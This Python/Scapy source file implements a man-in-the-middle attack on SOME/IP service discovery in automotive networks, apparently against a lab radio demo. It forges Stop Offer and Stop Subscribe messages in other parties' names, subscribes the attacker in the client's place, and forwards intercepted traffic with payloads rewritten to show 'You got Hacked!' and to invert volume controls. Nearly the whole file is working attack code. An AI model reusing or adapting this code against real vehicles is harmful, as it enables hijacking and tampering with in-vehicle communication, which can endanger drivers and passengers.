from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.contrib.automotive.someip import SOMEIP, SDEntry_Service, SDEntry_EventGroup, SDOption_IP4_EndPoint, SD

##################################################################################
# Constants

METHOD_BIT = 0
EVENT_BIT = 1
SUBSCRIBE = 0
SUBSCRIBE_ACK = 1
STOP_SUBSCRIBE = 2
STOP_OFFER = 3

##################################################################################
# CLASSES

class Clientdata:
    def __init__(self, ip: str, mac: str, port: int, sd_eventgroup_id: int):
        # We use the endpoint given by client
        self.ip = ip
        self.mac = mac
        self.port = port
        # We save the eventgroup_id as it is sent by client SUBSCR and not in the offer
        self.sd_eventgroup_id = sd_eventgroup_id
        self.subscribedToAdv = False
        # session ID after first 3 offers for data aquisishion
        self.sessId = 4

        
class Serverdata:
    def __init__(self, ip: str, mac: str, someip_method_id: int, sd_service_id: int, sd_instance_id: int):
        self.ip = ip
        self.mac = mac
        self.someip_method_id = someip_method_id
        self.sd_service_id = sd_service_id
        self.sd_instance_id = sd_instance_id

# Base Info - Singleton
class BaseInfo:    
    def __init__(self):
        self.client = None
        self.server = None
        self.sd_offerP = None
        self.offerId = None
    
    @property
    def client(self):
        return self._client

    @client.setter
    def client(self, client: Clientdata):
        self._client = client
    
    @property
    def server(self):
        return self._server

    @server.setter
    def server(self, server: Serverdata):
        self._server = server
        
    @property
    def sd_offerP(self):
        return self._sd_offerP

    @sd_offerP.setter
    def sd_offerP(self, sd_offerP: SD):
        self._sd_offerP = sd_offerP


##################################################################################
# SENDING FUNCTIONS FOR SD MESSAGES

# Send Subscr Ack from Attacker to client
def subscr_ack_client (attackerIp, attackerMac, sendI, client: Clientdata, server: Serverdata):
    client.sessId += 1
    send_SD (attackerIp, attackerMac, None, sendI, client.ip, client.mac, client.sessId, server.someip_method_id, server.sd_service_id, server.sd_instance_id, client.sd_eventgroup_id, SUBSCRIBE_ACK,None,None)

# Send Stop Subscribe in the name of client
def send_stop_sub (attackerIp,attackerMac,sendI, client: Clientdata, server: Serverdata):
    client.sessId += 1
    send_SD (attackerIp, attackerMac, client.port, sendI, server.ip, server.mac, client.sessId, server.someip_method_id, server.sd_service_id, server.sd_instance_id, client.sd_eventgroup_id, STOP_SUBSCRIBE,client.ip, client.port)

# Send Stop Offer to client
def send_stop_offer (attackerIp, attackerMac, attackerPort, sendI, client: Clientdata, server: Serverdata):
    client.sessId += 1
    send_SD (attackerIp, attackerMac, attackerPort, sendI, client.ip, client.mac, client.sessId, server.someip_method_id, server.sd_service_id, server.sd_instance_id, client.sd_eventgroup_id, STOP_OFFER,server.ip,30509)

# Subscribe to Server
def subscr_srv (attackerIp, attackerMac, attackerPort, sendI, client: Clientdata, server: Serverdata):
    client.sessId += 1
    send_SD (attackerIp, attackerMac, attackerPort, sendI, server.ip, server.mac, client.sessId, server.someip_method_id, server.sd_service_id, server.sd_instance_id, client.sd_eventgroup_id, SUBSCRIBE,None,None)

# BASE FUNCTION
# STANDARD: https://some-ip.com/papers/cache/AUTOSAR_SWS_ServiceDiscovery_4.2.1.pdf 
def send_SD (srcIp, srcMac, sipPort, sendInt, dstIp, dstMac, sessionId, methId, entryServId, entryInstId, entryEvgrId, type, endPIp, endPPort):
    #lower layers
    eth = Ether(src=srcMac, dst=dstMac)
    udp = UDP(sport=30490, dport=30490)
    ip = IP(src=srcIp, dst=dstIp)

    # SOME/IP layer
    sip = SOMEIP()
    sip.iface_ver = 1
    sip.proto_ver = 1
    sip.msg_type = "NOTIFICATION"
    sip.retcode = "E_OK"
    sip.srv_id = 0xffff
    sip.method_id = methId
    sip.session_id = sessionId
    
    # TODO: CHECK IF ALL TYPE OF SD MESSAGES NEED EVENT GROUP
    eeg = SDEntry_EventGroup ()
    # PACKET TYPE
    if (type == STOP_OFFER):
        eeg.type = 0x01
    elif (type == SUBSCRIBE or type == STOP_SUBSCRIBE):
        eeg.type = 0x06
    elif (type == SUBSCRIBE_ACK):
        eeg.type = 0x07
    # NUMBER OPTS
    if (type == SUBSCRIBE_ACK):
        eeg.n_opt_1 = 0x0
    else:
        eeg.n_opt_1 = 0x1
    eeg.srv_id = entryServId
    eeg.inst_id = entryInstId
    eeg.major_ver = 0x00
    if (type == STOP_SUBSCRIBE or type == STOP_OFFER):
        eeg.ttl = 0
    else:   
        eeg.ttl = 3
    #If not excluded, Eventgroup ID is written into Minor Version field
    if (type != STOP_OFFER):
        eeg.eventgroup_id = entryEvgrId

    if (type == SUBSCRIBE or type == STOP_OFFER or type == STOP_SUBSCRIBE):
        oa = SDOption_IP4_EndPoint()
        oa.l4_proto = 0x11 # UDP = 17

        if (type == SUBSCRIBE):
            oa.addr = srcIp
            # attacker port
            oa.port = sipPort # 60040 # 30179 # From Radio example
        # Send Endpoint in the name of Original Server (STop Offer) or Client (Stop Subs)
        else:
            oa.addr = endPIp
            oa.port = endPPort
        
        
    # Build SD packet and send
    # https://scapy.readthedocs.io/en/latest/api/scapy.contrib.automotive.someip.html#scapy.contrib.automotive.someip.SD.FLAGSDEF
    sd = SD()
    sd.flags = 0xc0
    sd.set_entryArray(eeg)
    if (type == SUBSCRIBE or type == STOP_OFFER or type == STOP_SUBSCRIBE):
        sd.set_optionArray(oa)
    sbscrAckPkt = eth/ip/udp/sip/sd
    sendp(sbscrAckPkt, iface=sendInt, verbose=False)



############################################################################################################
# Communication handling while ongoing attack

# Messages of original server are manipulated and forwarded to client from attacker
def forward_man_sip_client (packet, client: Clientdata, server: Serverdata, attackerIP, attackerMAC, sendingInterface, debugF):
    if (packet[IP].src == server.ip):
        SERVER_TO_CLIENT = True    
    else:
        SERVER_TO_CLIENT = False    
    
    packet[IP].src = attackerIP
    packet[Ether].src = attackerMAC
    if SERVER_TO_CLIENT:
        if debugF: print ("Forwarding manipulated packet: server -> client")
        packet[Ether].dst = client.mac
        packet[IP].dst = client.ip
    else:
        if debugF: print ("Forwarding manipulated packet: client -> server")
        packet[Ether].dst = server.mac
        packet[IP].dst = server.ip
    # SOME/IP WITH payload not interpreted correctly by Scapy
    if not packet.haslayer(Raw):
        if debugF: packet.show()
        raise ValueError("Packet has no payload")
        
    # Interpret Raw packet into Scapy SOME/IP class and change Payload
    raw = packet[Raw].load
    # multiple SOME/IP layers possible
    sipLayerList = []
    offset = 0
    # len variable - 8 = packet payload
    udpPayLen = packet[UDP].len - 8
    
    # Go through all Some/IP layers
    while (offset < udpPayLen):
        servId = int.from_bytes(raw[0 + offset: 2 + offset], "big")
        methId = int.from_bytes(raw[2 + offset: 4 + offset], "big")
        # Len var of SOME/IP layer
        sipLenVar = int.from_bytes(raw[4 + offset : 8 + offset], "big")
        cliId = int.from_bytes(raw[8 + offset : 10 + offset], "big")
        sessId = int.from_bytes(raw[10 + offset : 12 + offset], "big")
        intVer = int.from_bytes(raw[13 + offset : 14 + offset], "big")
        msgType = int.from_bytes(raw[14 + offset : 15 + offset], "big")
        # Payload len derived from len var
        payloadLen = sipLenVar - 8
        payload = Raw (rewrite_payload (methId, raw[16 + offset : 16 + offset + payloadLen]))
        # length of whole SIP layer added on offset to start on new SOME/IP layer
        offset += sipLenVar + 8
        # SOMEIP PACKET BUILDING
        sip = SOMEIP()
        sip.iface_ver = intVer
        sip.proto_ver = 1
        if SERVER_TO_CLIENT and msgType == 0x02:
            sip.msg_type = "NOTIFICATION"
        elif SERVER_TO_CLIENT and msgType == 0x80:
            sip.msg_type = "RESPONSE"
        else:
            sip.msg_type = "REQUEST"
        sip.retcode = "E_OK"
        sip.srv_id = servId
        # NOTE: Needed as Scapy handels method ID and Sub ID with specified variables in Packet
        scapy_sub_id, scapy_methId = reverse_meth_id (methId)
        sip.sub_id = scapy_sub_id
        if scapy_sub_id == METHOD_BIT:
            sip.method_id = scapy_methId
        else:
            sip.event_id = scapy_methId
        sip.session_id = sessId
        if SERVER_TO_CLIENT:
            # NOTE: Hardcoded Client ID
            # sip.client_id = cliId
            sip.client_id = 0x5555
        else:
            sip.client_id = 0
            # sip.client_id = cliId
        sip.len = len(payload.load) + 8
        sip.add_payload(payload)
        
        sipLayerList.append(sip)

    # Delete Raw layer
    packet[UDP].remove_payload()
    # Set UDP port
    if SERVER_TO_CLIENT:
        packet[UDP].dport = client.port
    else:
        packet[UDP].dport = 30509
    
    # Add all Some/IP layers
    for sipLay in sipLayerList:
        packet/=sipLay
    
    # Recompute checksums + length due to payload change
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    sendp (packet, iface= sendingInterface, verbose=False)

def send_event(srcIp, srcMac, dstIp, dstMac, dstPort, sendInt, sessionId, srvId, instId, methId, payload_bytes):
    # layers
    eth = Ether(src=srcMac, dst=dstMac)
    ip = IP(src=srcIp, dst=dstIp)
    udp = UDP(sport=30509, dport=dstPort)

    # SOME/IP layer
    sip = SOMEIP()
    sip.iface_ver = 1
    sip.proto_ver = 1
    sip.msg_type = "NOTIFICATION"
    sip.retcode = "E_OK"
    sip.srv_id = srvId
    
    scapy_sub_id, scapy_methId = reverse_meth_id(methId)
    sip.sub_id = scapy_sub_id
    if scapy_sub_id == METHOD_BIT:
        sip.method_id = scapy_methId
    else:
        sip.event_id = scapy_methId
        
    sip.session_id = sessionId
    sip.client_id = 0x0000 # Events usually have client_id 0 from server
    
    payload = Raw(load=payload_bytes)
    sip.len = len(payload.load) + 8
    sip.add_payload(payload)

    pkt = eth/ip/udp/sip
    sendp(pkt, iface=sendInt, verbose=False)


#event id = 0x8100 is dissected: sub_id=EVENT_BIT, event_id=0x100
#event id = 0xa100 is dissected: sub_id=EVENT_BIT, event_id=0x2100
def compute_meth_id (sub_id, ev_id):
    #from 0x8000 onwards = Event ID
    if (sub_id == EVENT_BIT):
        return ev_id + 0x8000
    elif (sub_id == METHOD_BIT):
        return ev_id 
    raise ValueError('Packet had unknown sub_id!')

def reverse_meth_id (meth_id):
    sub_id = METHOD_BIT
    event_id = meth_id

    if meth_id >= 0x8000:
        sub_id = EVENT_BIT
        event_id = meth_id - 0x8000
    return sub_id, event_id

# Define what to do on the payload - method reply of original server
def rewrite_payload (methId, bytesPayl):
    match methId:
        # EVENTS
        case 0x8001:
            # Original Volume byte
            return bytesPayl 
        case 0x8002: 
            return 'You' # Station
        case 0x8003: 
            return 'got' # Song (Mapped to 0x8003 in services.hpp)
        case 0x8004: 
            return 'Hacked!' # Artist (Mapped to 0x8004 in services.hpp)
        # Switch song (do nothing)
        case 0x0005:
            return bytesPayl
        # Radio ON/OFF (do nothing)
        case 0x0002:
            return bytesPayl
        # METHODS
        case 0x0004:
            # Switch control bytes (+ acts as - and vice versa)
            if int.from_bytes (bytesPayl, "big") == 0xfffffff6:
                return bytes.fromhex ('0000000a')
            elif int.from_bytes (bytesPayl, "big") == 0x0a:
                return bytes.fromhex ('fffffff6')
        case _:
            # return bytesPayl
            # print ("METHOD ID:{}".format(methId))
            raise ValueError (f'FORGOT TO MATCH method id {methId}!')

#################################################################################
# lfilter functions
def std_someip_lfilter (p):
    if (p.haslayer (SOMEIP) and p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)):
        return True
    elif (p.haslayer(Raw) and p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)):
        return True
    return False

def check_service_inst_id (p, srvId, instId):
    return std_sd_lfilter(p) and p[SD].entry_array[0].srv_id == srvId and p[SD].entry_array[0].inst_id == instId

def std_sd_lfilter (p):
    return p.haslayer(SD) and p.haslayer (SOMEIP) and p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)

def check_if_offer (p):
    # Assuming no malformed SOME/IP packets
    # ttl = 0 -> STOP OFFER PACKET
    if std_sd_lfilter(p):
        ea = p[SD].entry_array[0]
        return ea.type == 0x1 and ea.ttl != 0
    else:
        return False

def check_if_sub_to_attk (p, clientIp, attIp):
    # Check if client subscribed to server
    if std_sd_lfilter (p):
        lastEntrySub = False
        entries = p[SD].len_entry_array//16
        # Go through all entries, if last entry SUB -> True
        for entr in range (entries):
            ea = p[SD].entry_array[entr]
            # ttl = 0 -> STOP SUBSCRIBE packet
            if (p[IP].dst== attIp and p[IP].src == clientIp and ea.type == 0x06 and ea.ttl != 0):
                lastEntrySub = True
            else:
                lastEntrySub = False
        return lastEntrySub
    else:
        return False

def check_someip_payload (p):
    return p.haslayer(Raw) and not p.haslayer(SD) and p.haslayer(UDP) and p.haslayer(IP) and p.haslayer(Ether)

def ip_lfilter (p:packet, bI: BaseInfo, broadIp, attackerIp):
    pSrcIp = p[IP].src
    pDstIp = p[IP].dst
    return (pSrcIp == bI.client.ip or pSrcIp == bI.server.ip) and (pDstIp == bI.client.ip or pDstIp == bI.server.ip or pDstIp == broadIp or pDstIp == attackerIp)